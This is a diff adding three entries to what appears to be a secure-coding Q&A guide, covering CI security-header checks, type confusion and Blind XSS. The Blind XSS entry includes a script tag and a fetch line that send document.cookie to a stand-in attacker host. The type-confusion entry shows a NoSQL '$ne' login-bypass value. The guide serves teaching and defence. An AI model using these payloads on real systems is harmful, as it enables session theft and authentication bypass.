@@ -2054,3 +2054,105 @@ Because this vulnerability arises specifically from an *inconsistency between tw
 **Common Pitfall:** assuming HTTPS/TLS termination at the proxy prevents this attack — Request Smuggling is a parsing-ambiguity problem entirely independent of transport encryption; a request smuggled successfully over a TLS-terminated connection is just as effective as one sent over plain HTTP, since the vulnerability lies in how the proxy and backend each interpret the (now-decrypted) request's headers, not in whether the transport itself was encrypted.
 
 ---
+
+## Beginner — Question 22
+
+**Q22: What is an automated Security Header Scan in CI, and how does verifying the presence of expected security headers (HSTS, CSP, X-Content-Type-Options, all covered earlier) on every deploy catch a regression where a header gets accidentally removed?**
+
+Rather than relying on someone manually checking response headers after each deployment, an automated CI check can send a request to the deployed application and assert that every expected security header is actually present with the expected value — turning "did we accidentally remove our CSP header during that refactor" into an automatic, immediate build failure rather than a silent regression discovered much later (or not at all).
+
+```csharp
+[Fact]
+public async Task Response_Should_Include_Expected_Security_Headers()
+{
+    var response = await _client.GetAsync("/");
+
+    Assert.True(response.Headers.Contains("Strict-Transport-Security"));
+    Assert.True(response.Headers.Contains("X-Content-Type-Options"));
+    Assert.True(response.Headers.Contains("Content-Security-Policy"));
+}
+```
+
+```text
+WITHOUT an automated check: a REFACTOR accidentally removes middleware
+  registering the CSP header -- NOTHING catches this until (or unless) a
+  human happens to NOTICE the missing header, potentially LONG after the
+  regression shipped to PRODUCTION
+
+WITH an automated CI check: the SAME refactor immediately FAILS the build,
+  the MOMENT the missing header is DETECTED -- the regression NEVER
+  reaches production at ALL
+```
+
+Because security headers are typically configured once via middleware and then rarely touched directly, a regression removing one is more likely to be an *accidental side effect* of an unrelated refactor than a deliberate change — an automated, CI-enforced check catches exactly this class of silent regression, treating a security header's presence as a genuine, tested contract rather than an assumption nobody actively verifies.
+
+**Common Pitfall:** verifying security headers only through occasional manual spot-checks (an external tool run once, during an initial security review) rather than as a permanent, automated part of the CI pipeline — a one-time manual check provides no protection against a regression introduced by a refactor that happens months later, long after the original review concluded the headers were correctly configured.
+
+---
+
+## Intermediate — Question 23
+
+**Q23: What is a Type Confusion vulnerability, and how can an unexpected input type — accepted by a dynamically-typed or loosely-validated code path — let an application's logic misbehave in an exploitable way?**
+
+Type Confusion arises when code assumes an input will be of one specific type (a string, a single value) but a dynamically-typed language or loosely-validated deserialization path actually allows a different type (an array, an object) to reach that same code path — the application's logic, written assuming the expected type, can then behave in an unintended, sometimes security-relevant way when handed a genuinely different type it never accounted for.
+
+```javascript
+// A login endpoint expecting "password" to be a STRING
+if (req.body.password === storedPassword) { /* grant access */ }
+
+// An attacker sends: { "password": { "$ne": null } } instead of a string
+// In a loosely-typed comparison against certain backends (a NoSQL query-operator
+// injection, a specific angle of Type Confusion), this can bypass the intended
+// STRING equality check entirely, since the input was never validated as a string
+```
+
+```text
+Expected type (a plain string password): compared DIRECTLY against the
+  STORED password -- behaves EXACTLY as intended
+
+Unexpected type (an OBJECT/array, when a string was ASSUMED): depending on
+  the LANGUAGE/framework's own loose-typing or COMPARISON semantics, this
+  can produce an UNINTENDED result -- sometimes bypassing a check that
+  looks PERFECTLY correct when only STRING inputs are considered
+```
+
+Because the vulnerability arises specifically from an *assumption* about input type going unvalidated, the fix is straightforward once identified: explicitly validate an input's actual type (not just its presence) before using it in a security-sensitive comparison or operation — treating "the wrong type entirely" as a genuinely distinct failure mode from "the right type but a wrong/malicious value," which many validation approaches only guard against the latter of.
+
+**Common Pitfall:** validating that a required field is merely *present* in a request body, without validating that it's actually of the *expected type* — a loosely-typed or schema-less deserialization path can let an attacker substitute a completely different data structure than intended, bypassing logic that implicitly assumed a specific, narrower type without ever explicitly checking for it.
+
+---
+
+## Advanced — Question 22
+
+**Q22: What is Blind Cross-Site Scripting (Blind XSS), and how does an attacker's injected payload execute in an admin or backend user's browser — somewhere the attacker cannot directly observe — requiring an out-of-band callback mechanism to detect successful exploitation?**
+
+Ordinary XSS (covered earlier) is typically discovered and exploited against a page the attacker can directly view — Blind XSS instead targets a payload into data that will eventually be viewed by a *different*, privileged user in a completely different context the attacker has no visibility into at all (a support ticket's free-text field later reviewed in an internal admin dashboard, a contact form submission viewed in a back-office system) — the attacker never sees the resulting execution directly, and must rely on the payload itself making an out-of-band network callback to a server the attacker controls to confirm it actually fired.
+
+```html
+<!-- Submitted via an ORDINARY, public-facing contact form field -->
+<script src="https://attacker-controlled.example/blind-xss-payload.js"></script>
+```
+```javascript
+// blind-xss-payload.js, served from the attacker's OWN server
+fetch('https://attacker-controlled.example/callback?cookie=' + document.cookie);
+// this only EXECUTES much LATER, when an ADMIN views the submitted contact-form
+// entry in an INTERNAL dashboard -- the ATTACKER has ZERO visibility into WHEN
+// or WHETHER this happens, EXCEPT via this callback hitting their OWN server
+```
+
+```text
+Ordinary (non-blind) XSS: the ATTACKER directly views the page where their
+  payload executes -- IMMEDIATE feedback on whether the injection WORKED
+
+Blind XSS: the payload EXECUTES somewhere the ATTACKER has NO direct
+  visibility into (an internal admin TOOL, a backend REVIEW dashboard) --
+  the ONLY way to confirm SUCCESSFUL exploitation is the payload itself
+  making an OUT-OF-BAND network CALLBACK to infrastructure the attacker
+  controls and MONITORS
+```
+
+Because Blind XSS specifically targets *internal, privileged* contexts (admin dashboards, back-office tools) that a public-facing security scan would never actually see or test, it represents a genuinely distinct risk category from ordinary, directly-observable XSS — any user-supplied input that might eventually be *displayed* somewhere else in the system, even an internal-only tool, needs the same output-encoding discipline (covered under ordinary XSS) applied consistently, not just input fields on public-facing pages.
+
+**Common Pitfall:** focusing XSS prevention efforts exclusively on public-facing pages while neglecting internal admin/back-office tools that display user-submitted content — Blind XSS specifically exploits exactly this gap, since internal tools are often assumed (incorrectly) to be a lower-risk environment simply because they're not directly public-facing, when in fact a successful Blind XSS payload executing in an *admin's* browser can be considerably more damaging than one executing in an ordinary user's.
+
+---
